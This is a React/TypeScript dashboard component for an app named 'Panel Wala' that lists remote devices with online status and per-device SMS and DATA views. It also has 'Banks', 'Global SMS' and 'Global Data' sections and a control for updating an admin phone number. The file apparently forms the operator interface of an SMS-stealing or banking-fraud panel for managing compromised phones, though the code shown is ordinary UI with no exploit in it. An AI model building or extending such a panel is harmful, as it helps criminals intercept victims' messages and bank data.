import React, { useState, useEffect, useMemo, useRef } from 'react';
import { DeviceInfo, User } from '../types';
import { 
  subscribeToUsers, 
  subscribeToSystemNotifications, 
  subscribeToNotification, 
  decryptToken, 
  getCurrentAccessToken,
  subscribeToFavorites,
  updateFavoritesInDb
} from '../services/firebase';
import AdminNumberModal from './AdminNumberModal';

interface HomeProps {
  onSelectUserForSMS: (user: DeviceInfo) => void;
  onSelectUserForData: (user: DeviceInfo) => void;
  onLogout: () => void;
  onOpenNotifications: () => void;
  onOpenFavorites: () => void;
  onNav?: (id: string) => void;
  user: User | null;
  highlightUserId?: string | null;
}

function timeAgo(timestamp: number | undefined): string {
  if (!timestamp) return 'Never';
  const now = Date.now();
  const diff = now - timestamp;
  if (diff < 0) return 'Just now';
  const mins = Math.floor(diff / 60000);
  if (mins < 60) return `${mins}m ago`;
  const hrs = Math.floor(mins / 60);
  if (hrs < 24) return `${hrs}h ago`;
  return `${Math.floor(hrs / 24)}d ago`;
}

const Home: React.FC<HomeProps> = ({ 
  onSelectUserForSMS, 
  onSelectUserForData, 
  onLogout,
  onOpenNotifications,
  onOpenFavorites,
  onNav,
  user,
  highlightUserId
}) => {
  const [users, setUsers] = useState<DeviceInfo[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [filterStatus, setFilterStatus] = useState<'All' | 'Online' | 'Offline' | 'Unchecked'>('All');
  const [favorites, setFavorites] = useState<string[]>([]);
  const [unreadCount, setUnreadCount] = useState(0);
  const [notificationMsg, setNotificationMsg] = useState('');
  const [showAdminModal, setShowAdminModal] = useState(false);
  const deviceRefs = useRef<Record<string, HTMLDivElement | null>>({});

  const projectId = useMemo(() => {
    const tok = getCurrentAccessToken();
    const url = decryptToken(tok);
    if (!url) return 'V90';
    const match = url.match(/panel-wala-([^-]+)-default/);
    return match ? match[1].toUpperCase() : 'V90';
  }, []);

  useEffect(() => {
    const unsubNotify = subscribeToNotification(setNotificationMsg);
    const unsubSystemNotify = subscribeToSystemNotifications((notifs) => setUnreadCount(notifs.filter(n => !n.read).length));
    
    // Subscribe to favorites from Database
    let unsubFavs: () => void = () => {};
    if (user?.userId) {
       unsubFavs = subscribeToFavorites(user.userId, setFavorites);
    }

    const unsubscribe = subscribeToUsers((data) => {
      setUsers(data);
      setLoading(false);
    });

    return () => { unsubscribe(); unsubSystemNotify(); unsubNotify(); unsubFavs(); };
  }, [user?.userId]);

  useEffect(() => {
    if (highlightUserId && deviceRefs.current[highlightUserId]) {
        deviceRefs.current[highlightUserId]?.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }
  }, [highlightUserId, users]);

  const toggleFavorite = async (e: React.MouseEvent, userId: string) => {
    e.stopPropagation();
    if (!user?.userId) return;
    
    let newFavs = favorites.includes(userId) 
      ? favorites.filter(id => id !== userId) 
      : [...favorites, userId];
    
    // Update Database directly
    await updateFavoritesInDb(user.userId, newFavs);
  };

  const filteredUsers = useMemo(() => {
    let res = users.filter(u => {
        const s = searchTerm.toLowerCase();
        return (u.Brand||'').toLowerCase().includes(s) || (u.DeviceId||'').toLowerCase().includes(s);
    });
    if (filterStatus === 'Online') res = res.filter(u => u.Status === 'Online');
    else if (filterStatus === 'Offline') res = res.filter(u => u.Status === 'Offline');
    else if (filterStatus === 'Unchecked') res = res.filter(u => !u.checked);
    return res.sort((a,b) => (b.timestamp || 0) - (a.timestamp || 0));
  }, [users, searchTerm, filterStatus]);

  return (
    <div className="h-full flex flex-col bg-[#f3f4f6] relative">
      {notificationMsg && (
        <div className="bg-blue-600 text-white text-[10px] font-black h-8 flex items-center shrink-0 overflow-hidden relative z-50">
            <div className="animate-marquee whitespace-nowrap px-4 absolute w-full">{notificationMsg}</div>
        </div>
      )}

      <header className="bg-white border-b border-gray-200 px-4 py-3 flex items-center justify-between sticky top-0 z-20 shadow-sm shrink-0">
        <div className="flex items-center space-x-3 min-w-0">
          <div className="bg-app-green/10 p-2 rounded-xl text-app-green shrink-0">
             <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 01-2-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10" /></svg>
          </div>
          <div className="min-w-0">
            <h1 className="text-sm md:text-lg font-black text-gray-900 tracking-tight truncate uppercase">Panel Wala {projectId}</h1>
            <div className="flex items-center gap-1.5 text-[9px] font-black uppercase whitespace-nowrap">
                <span className="text-app-green">{users.filter(u=>u.Status==='Online').length} ONLINE</span>
                <span className="text-gray-300">•</span>
                <span className="text-gray-400">{users.length} TOTAL</span>
                <span className="text-gray-300">•</span>
                <span className="text-blue-600">{user?.userType || 'Client'}</span>
            </div>
          </div>
        </div>

        <div className="flex items-center">
          <button onClick={() => setShowAdminModal(true)} className="p-2 text-gray-400 hover:text-app-green" title="Update Admin Number">
            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" /></svg>
          </button>
          <button onClick={onOpenFavorites} className="p-2 text-gray-400 hover:text-yellow-500"><svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.518 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.921-.755 1.688-1.54 1.118l-3.976-2.888a1 1 0 00-1.175 0l-3.976 2.888c-.784.57-1.838-.197-1.539-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.382-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z" /></svg></button>
          <button onClick={onOpenNotifications} className="p-2 text-gray-400 relative">
             <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" /></svg>
             {unreadCount > 0 && <span className="absolute top-1.5 right-1.5 bg-red-500 text-white text-[8px] font-bold w-4 h-4 flex items-center justify-center rounded-full border border-white">{unreadCount}</span>}
          </button>
          <button onClick={onLogout} className="p-2 text-gray-400 hover:text-red-600"><svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" /></svg></button>
        </div>
      </header>

      <div className="px-4 py-3 bg-white border-b border-gray-100 flex items-center space-x-2 shrink-0">
          <input type="text" placeholder="Search devices..." value={searchTerm} onChange={(e) => setSearchTerm(e.target.value)} className="flex-1 bg-gray-50 border border-gray-200 rounded-xl px-4 py-2 text-sm outline-none focus:ring-2 focus:ring-app-green/20" />
          <select value={filterStatus} onChange={(e) => setFilterStatus(e.target.value as any)} className="bg-white border border-gray-200 rounded-xl px-3 py-2 text-xs font-black text-gray-600 outline-none">
            <option value="All">All</option>
            <option value="Online">Online</option>
            <option value="Offline">Offline</option>
            <option value="Unchecked">Unchecked</option>
          </select>
      </div>

      <div className="flex-1 overflow-y-auto p-4 scrollbar-hide pb-24">
        {loading ? <div className="flex justify-center py-20"><div className="w-10 h-10 border-4 border-app-green/20 border-t-app-green rounded-full animate-spin"></div></div> : filteredUsers.length === 0 ? <div className="text-center py-20 text-gray-400 font-medium">No results</div> : (
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
            {filteredUsers.map(u => (
              <div key={u.userId} ref={el => deviceRefs.current[u.userId] = el} className={`bg-white rounded-2xl border ${highlightUserId === u.userId ? 'border-app-green ring-4 ring-app-green/10' : 'border-gray-100'} shadow-sm flex flex-col overflow-hidden group animate-fadeIn`}>
                <div className={`h-1.5 w-full ${u.Status === 'Online' ? 'bg-green-500' : 'bg-gray-200'}`}></div>
                <div className="p-5 flex flex-col flex-1 relative">
                   <div className="flex justify-between items-start mb-4">
                     <div className="min-w-0 flex-1 pr-2">
                        <div className="flex items-center space-x-1.5">
                            <h3 className="font-bold text-gray-900 truncate text-base leading-tight pr-2">{u.Brand || 'Unknown'}</h3>
                            {u.checked && <svg className="w-4 h-4 text-blue-500 fill-current" viewBox="0 0 20 20"><path d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" /></svg>}
                        </div>
                        <p className="text-[10px] font-mono text-gray-400 mt-1 truncate">{u.DeviceId}</p>
                     </div>
                     <div className="flex items-center space-x-1 shrink-0">
                        <button onClick={(e) => toggleFavorite(e, u.userId)} className="p-1 rounded-full hover:bg-gray-100 transition-colors">
                          <svg className={`w-5 h-5 ${favorites.includes(u.userId) ? 'text-yellow-400 fill-current' : 'text-gray-300'}`} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.518 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.921-.755 1.688-1.54 1.118l-3.976-2.888a1 1 0 00-1.175 0l-3.976 2.888c-.784.57-1.838-.197-1.539-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.382-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z" /></svg>
                        </button>
                        <span className={`text-[9px] font-black px-2 py-0.5 rounded-full uppercase shrink-0 ${u.Status === 'Online' ? 'bg-green-100 text-green-700' : 'bg-gray-100 text-gray-400'}`}>{u.Status}</span>
                     </div>
                   </div>
                   <div className="flex items-center text-[10px] text-gray-400 font-bold mb-6">
                      <svg className="w-3 h-3 mr-1.5 opacity-60" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
                      {timeAgo(u.timestamp)}
                   </div>
                   <div className="grid grid-cols-2 gap-3 mt-auto pt-4 border-t border-gray-50">
                      <button onClick={() => onSelectUserForSMS(u)} className="py-2.5 bg-gray-50 hover:bg-app-green hover:text-white text-gray-600 rounded-xl text-xs font-bold transition-all shadow-sm">SMS</button>
                      <button onClick={() => onSelectUserForData(u)} className="py-2.5 bg-gray-50 hover:bg-blue-600 hover:text-white text-gray-600 rounded-xl text-xs font-bold transition-all shadow-sm">DATA</button>
                   </div>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>

      <nav className="bg-white border-t border-gray-200 px-2 flex items-center justify-around fixed bottom-0 left-0 w-full h-[72px] z-40 shadow-[0_-4px_15px_rgba(0,0,0,0.03)]">
         <button onClick={() => onNav?.('HOME')} className={`flex-1 flex flex-col items-center justify-center p-2 rounded-2xl transition-all ${searchTerm === '' && filterStatus === 'All' ? 'text-app-green' : 'text-gray-400'}`}>
            <svg className="w-6 h-6 mb-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6" /></svg>
            <span className="text-[10px] font-black uppercase tracking-widest">Home</span>
         </button>
         <button onClick={() => onNav?.('MESSAGES')} className="flex-1 flex flex-col items-center justify-center p-2 text-gray-400 hover:text-app-green transition-all">
            <svg className="w-6 h-6 mb-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M7 8h10M7 12h4m1 8l-4-4H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-3l-4 4z" /></svg>
            <span className="text-[10px] font-black uppercase tracking-widest">Apps</span>
         </button>
         <button onClick={() => onNav?.('BANK_SUM')} className="flex-1 flex flex-col items-center justify-center p-2 text-gray-400 hover:text-app-green transition-all">
            <svg className="w-6 h-6 mb-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" /></svg>
            <span className="text-[10px] font-black uppercase tracking-widest">Banks</span>
         </button>
         <button onClick={() => onNav?.('GLOBAL_SMS')} className="flex-1 flex flex-col items-center justify-center p-2 text-gray-400 hover:text-app-green transition-all">
            <svg className="w-6 h-6 mb-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" /></svg>
            <span className="text-[10px] font-black uppercase tracking-widest">SMS</span>
         </button>
         <button onClick={() => onNav?.('GLOBAL_DATA')} className="flex-1 flex flex-col items-center justify-center p-2 text-gray-400 hover:text-app-green transition-all">
            <svg className="w-6 h-6 mb-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4m0 5c0 2.21-3.582 4-8 4s-8-1.79-8-4" /></svg>
            <span className="text-[10px] font-black uppercase tracking-widest">Data</span>
         </button>
      </nav>

      {showAdminModal && <AdminNumberModal onClose={() => setShowAdminModal(false)} />}
    </div>
  );
};

export default Home;